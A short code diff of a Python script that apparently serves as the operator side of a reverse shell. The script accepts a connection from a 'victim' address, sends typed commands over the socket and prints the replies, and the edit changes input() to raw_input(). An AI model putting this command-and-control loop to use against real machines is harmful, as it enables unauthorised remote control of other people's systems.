@@ -9,7 +9,7 @@ connection,vic_address=listener.accept()
 print("[+]Got a connection from"+str(vic_address))
 
 while True:
-    command = input(">>")
+    command = raw_input(">>")
     connection.send(command)
     result=connection.recv(1024)
     print(result)
